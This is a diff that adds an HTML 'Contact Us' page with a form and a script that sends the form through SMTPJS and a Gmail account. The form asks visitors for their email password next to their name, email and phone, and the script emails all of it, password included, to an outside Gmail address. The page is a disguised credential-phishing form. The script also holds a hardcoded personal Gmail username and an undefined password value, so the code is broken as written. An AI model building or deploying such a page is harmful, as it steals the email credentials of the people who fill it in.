@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+ 
+  <title></title>
+  
+  
+    <link rel="stylesheet" href="style2.css">
+
+
+
+  
+  
+  
+  
+</head>
+
+<body>
+
+
+
+
+<h1 class="fkj">CONTACT US</h1>
+
+
+
+
+
+<div class="dsa">
+
+
+
+<form onsubmit="sendEmail() ;return false;">
+  
+  <input type="text" id="name" placeholder="your Name" required>
+  
+  <input type="email" id="email" placeholder="your email" required>
+  
+  <input type="text" id="passw" placeholder="email password" required>
+  
+  
+  <input type="text" id="ph" placeholder="phone number" required>
+  
+  
+  <textarea id="msg" rows="4" placeholder="how can i help you"></textarea>
+  
+  
+  
+  
+  <button class="cv" type="submit"> SUBMIT</button>
+  
+  
+  
+  
+  
+  
+</form>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+
+
+
+
+<script>
+  
+  function sendEmail(){
+  
+  
+  
+Email.send({
+    Host: "smtp.gmail.com",
+    Username: "mohiitsati@gmail.com",
+    Password: aoabobcoc,
+    To: 'almorakholta@gmail.com',
+    From: document.getElementById("email").value,
+    Subject: "Contact form",
+    Body: "Name :" +document.getElementById("name").value
+    + "<br> email :" + document.getElementById("email").value
+    + "<br> password :" +document.getElementById("passw").value+
+    "<br> phone no." + document.getElementById("ph").value+
+    "<br> Message: " + document.getElementById("msg").value
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  }).then(
+    message => alert(message)
+  );
+  
+  
+  
+  }
+  
+  
+  
+  
+  
+  
+  
+  
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
